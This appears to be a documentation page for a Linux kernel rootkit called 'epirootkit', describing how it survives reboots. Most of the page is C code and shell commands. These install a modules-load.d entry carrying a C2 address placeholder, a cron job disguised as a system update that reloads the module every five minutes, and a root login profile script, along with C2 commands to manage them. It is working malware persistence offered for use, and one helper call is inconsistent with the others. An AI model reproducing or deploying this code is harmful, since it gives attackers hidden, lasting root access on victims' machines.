---
title: "Persistence"
description: "Multiple boot persistence mechanisms for rootkit survival"
icon: "refresh"
date: "2025-05-25T00:00:00+01:00"
lastmod: "2025-05-25T00:00:00+01:00"
draft: false
toc: true
weight: 513
---

# Persistence

Multiple boot persistence mechanisms to ensure rootkit survival across system reboots.

## Three Mechanisms

### 1. modules-load.d
**File**: `/etc/modules-load.d/jules_est_bo_system.conf`  
**Content**: `epirootkit address=X.X.X.X port=YYYY`  
**Trigger**: systemd reads config and loads module automatically on boot

### 2. Cron Jobs  
**File**: `/etc/cron.d/jules_est_bo_update`  
**Schedule**: Every 5 minutes check and load if not present  
**Stealth**: Disguised as system update task with stealth naming

### 3. Shell Profiles
**File**: `/etc/profile.d/jules_est_bo_env.sh`  
**Trigger**: Executes when root user logs in  
**Check**: Loads module if not already present

## Implementation

### Automatic Installation
```c
int persistence_init(void)
{
    return persistence_install(); // Install all mechanisms
}
```

### Individual Mechanisms
```c
// modules-load.d persistence
int persistence_install_modules_load(void)
{
    return write_file("/etc/modules-load.d/jules_est_bo_system.conf", "epirootkit address=X.X.X.X port=YYYY\n");
}

// Cron persistence (every 5 minutes)
int persistence_install_cron(void) 
{
    const char *cron_content = 
        "*/5 * * * * root /bin/bash -c 'if ! lsmod | grep -q epirootkit; then "
        "modprobe epirootkit 2>/dev/null || "
        "insmod /lib/modules/$(uname -r)/extra/epirootkit.ko 2>/dev/null; fi'\n";
    
    return write_file("/etc/cron.d/jules_est_bo_update", cron_content, 0644);
}

// Shell profile persistence
int persistence_install_shell_profile(void)
{
    const char *profile_content = 
        "#!/bin/bash\n"
        "if [ \"$(id -u)\" -eq 0 ]; then\n"
        "    if ! lsmod | grep -q epirootkit 2>/dev/null; then\n"
        "        modprobe epirootkit 2>/dev/null\n"
        "    fi\n"
        "fi\n";
    
    return write_file("/etc/profile.d/jules_est_bo_env.sh", profile_content, 0755);
}
```

## Usage

### WebUI Control
Access via Persistence panel:
- **Install All**: Enable all three mechanisms
- **Remove All**: Disable all mechanisms  
- **Individual Control**: Toggle each mechanism separately

### C2 Commands
```bash
# Install all persistence mechanisms
persist_install Client-1

# Remove all mechanisms
persist_remove Client-1

# Individual control
persist_modules Client-1    # modules-load.d only
persist_cron Client-1       # cron only
persist_profile Client-1    # shell profile only
```

## Verification

### Check Installation
```bash
# modules-load.d
cat /etc/modules-load.d/jules_est_bo_system.conf
# epirootkit address=X.X.X.X port=YYYY

# Cron job
cat /etc/cron.d/jules_est_bo_update
# */5 * * * * root /bin/bash -c 'if ! lsmod | grep -q epirootkit; then modprobe epirootkit 2>/dev/null || insmod /lib/modules/$(uname -r)/extra/epirootkit.ko 2>/dev/null; fi'

# Shell profile
cat /etc/profile.d/jules_est_bo_env.sh
# #!/bin/bash
# if [ "$(id -u)" -eq 0 ]; then
#     if ! lsmod | grep -q epirootkit 2>/dev/null; then
#         modprobe epirootkit 2>/dev/null
#     fi
# fi
```

### Test Persistence
```bash
# Remove module and reboot
rmmod epirootkit
reboot

# Check if module reloaded
lsmod | grep epirootkit
# epirootkit               20480  0
```

All mechanisms are **enabled by default** and can be managed via WebUI or C2 commands.